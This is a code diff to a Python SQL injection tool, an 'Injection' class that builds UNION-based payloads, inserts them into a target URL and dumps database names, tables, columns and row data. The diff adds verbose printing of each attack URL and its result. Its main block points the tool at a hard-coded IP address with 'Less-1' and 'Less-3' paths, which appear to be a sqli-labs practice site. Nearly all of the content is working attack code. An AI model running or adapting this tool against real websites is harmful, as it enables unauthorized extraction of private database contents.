@@ -79,30 +79,34 @@ class Injection():
         self._get_serial_num()
 
         if level > 0:
-            self._get_databases()
+            if database == '':
+                self._get_databases()
         if level > 1:
-            self._get_tables(database)
+            if table == '':
+                self._get_tables([database])
         if level > 2:
-            self._get_columns(database, [table])
+            if len(columns) == 0:
+                self._get_columns(database, [table])
         if level > 3:
             self._get_data(database, table, columns)
 
 
     def _get_databases(self):
         databases = self._analysis_data()
-        for db in databases:
-            self.database.add_database(db)
+        print("数据库库名爆破：" + str(databases))
+        self.database.add_database(databases)
 
     def _get_tables(self, database=[]):
         databases = []
-        if len(database) != 0:
+        if database[0] != '':
             databases = database
         else:
             databases = self.database.get_databases()
         for db in databases:
             tables = self._analysis_data(db)
-            for tb in tables:
-                self.database.add_tables(db, tb)
+            print("数据库：" + db)
+            print("\t tables: " + str(tables))
+            self.database.add_tables(db, tables)
 
     def _get_columns(self, database='', table=[]):
         '''
@@ -122,6 +126,9 @@ class Injection():
             for db in self.database.get_databases():
                 for tb in self.database.get_tables(db):
                     columns = self._analysis_data(db, tb)
+                    print("database: "  + db)
+                    print("\ttable: " + tb)
+                    print("\t\t columns: " + str(columns))
                     self.database.add_column(db, tb, columns)
 
     def _get_data(self, database='', table='', columns=[]):
@@ -146,7 +153,11 @@ class Injection():
                     columns = self.database.get_columns(db, tb)
                     data = self._analysis_data(db, tb, columns)
                     for data_line in data:
-                        self.database.add_data(db, tb, columns, data_line.split(','))
+                        print("database: " + db)
+                        print("\ttable:" + tb)
+                        print("\t\tcolumns: " + str(columns))
+                        print("\t\t\tdata: " + data_line)
+                        self.database.add_data(db, tb, columns, data_line.split('`'))
 
     def _analysis_data(self, database='', table='', columns=[], split_char=','):
         '''
@@ -158,7 +169,11 @@ class Injection():
         '''
         payload = self.payload.union_sql(self._probe_num, self._serial_num, database, table, columns)
         url_malformation = self._url_ready.replace(self._magic_str, str(payload))
+        print("\033[0;41m%s\033[0m" % (url_malformation))
         result = self.page_info.get_info(url_malformation)
+        if result == '':
+            sys.stderr.write("result 结果异常" + "\n\turl attack: " + url_malformation)
+        print(result)
         return result.split(split_char)
 
     def _get_serial_num(self):
@@ -178,8 +193,9 @@ class Injection():
 
 
 if __name__ == '__main__':
-    inject = Injection('http://47.95.4.158:8002/Less-1/?id=1', '\'')
-    inject.exec_payload(1, 1)
+    inject = Injection('http://47.95.4.158:8002/Less-3/?id=2', '\') ')
+    # inject.exec_payload(1, 5, 'information_schema', 'CHARACTER_SETS')
+    inject.exec_payload(1, 4)
 
 
 
